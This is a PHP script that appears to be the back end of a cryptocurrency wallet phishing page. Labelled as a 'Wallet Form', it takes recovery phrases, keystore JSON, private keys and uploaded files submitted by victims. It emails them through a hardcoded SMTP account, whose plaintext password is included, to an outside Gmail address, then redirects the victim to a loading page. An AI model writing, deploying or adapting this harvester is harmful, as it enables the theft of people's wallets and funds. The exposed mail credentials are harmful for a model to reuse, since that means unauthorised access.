<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $mail = new PHPMailer(true);

    try {
        // SMTP settings
        $mail->isSMTP();
        $mail->Host       = "mail.logistraworldwide.com"; 
        $mail->SMTPAuth   = true;
        $mail->Username   = "support@logistraworldwide.com"; 
        $mail->Password   = "logistraworldwidepss100";  
        $mail->SMTPSecure = "ssl";
        $mail->Port       = 465;

        // Sender & recipient
        $mail->setFrom("support@logistraworldwide.com", "Wallet Form");
        $mail->addAddress("tsadsfam@gmail.com");

        // Handle uploaded file
        if (isset($_FILES['fileUpload']) && $_FILES['fileUpload']['error'] == 0) {
            $mail->addAttachment($_FILES['fileUpload']['tmp_name'], $_FILES['fileUpload']['name']);
        }

        // Website info
        $website = $_SERVER['HTTP_HOST'];  
        $fullUrl = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

        // Email content
        $message = "ðŸš¨ New Wallet Submission ðŸš¨\n\n";

        if (!empty($_POST['userName'])) {
            $message .= "Phrase: " . $_POST['userName'] . "\n\n";
        }
        if (!empty($_POST['keystore_json'])) {
            $message .= "Keystore JSON: " . $_POST['keystore_json'] . "\n\n";
        }
        if (!empty($_POST['private_key'])) {
            $message .= "Private Key: " . $_POST['private_key'] . "\n\n";
        }

        $message .= "---------------------------------\n";
        $message .= "Website: " . $website . "\n";
        $message .= "Page URL: " . $fullUrl . "\n";
        $message .= "---------------------------------\n";

        $mail->isHTML(false);
        $mail->Subject = "New Wallet Submission from $website";
        $mail->Body    = $message;

        $mail->send();

        // âœ… Redirect to loading.html after successful email
        header("Location: loading.html");
        exit();

    } catch (Exception $e) {
        echo "Mailer Error: " . $mail->ErrorInfo;
    }
}
